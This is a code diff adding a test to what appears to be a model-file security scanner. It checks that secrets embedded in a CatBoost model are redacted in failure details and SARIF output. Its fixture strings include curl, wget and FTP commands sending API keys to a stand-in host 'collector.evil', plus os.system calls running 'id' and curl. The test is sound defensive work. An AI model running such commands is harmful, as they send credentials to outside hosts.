@@ -2024,6 +2024,32 @@ def test_catboost_sarif_redacts_additional_serialized_and_argument_secrets(tmp_p
     assert "<redacted>" in sarif
 
 
+def test_catboost_sarif_redacts_command_and_nested_url_follow_up_secrets(tmp_path: Path) -> None:
+    secrets = [f"followup-secret-{index}" for index in range(7)]
+    evidence = [
+        f"curl --url-query api_key={secrets[0]} https://collector.evil/upload",
+        f"wget --post-data api_key={secrets[1]} https://collector.evil/upload",
+        f'config.get(key="api_key", default="{secrets[2]}"); os.system("id")',
+        f"curl --ftp-account {secrets[3]} ftp://collector.evil/upload",
+        (f'https://collector.evil/upload?next=https%3A%2F%2Fnested.evil%2Fapi_key%3D{secrets[4]}; os.system("id")'),
+        f'os.system("curl https://collector.evil/upload?api_" "key={secrets[5]}")',
+        f'os.system("API_KEY={secrets[6]} curl https://collector.evil/upload")',
+    ]
+    model_path = tmp_path / "catboost_command_follow_up_redaction.cbm"
+    model_path.write_bytes(_build_cbm(evidence))
+
+    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
+    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
+    sarif = format_sarif_output(result, [str(model_path)])
+
+    assert determine_exit_code(result) == 1
+    for secret in secrets:
+        assert secret not in failed_details
+        assert secret not in sarif
+    assert "<redacted>" in failed_details
+    assert "<redacted>" in sarif
+
+
 def test_false_positive_reduction_for_common_exec_system_words(tmp_path: Path) -> None:
     model_path = tmp_path / "false_positive_guard.cbm"
     model_path.write_bytes(
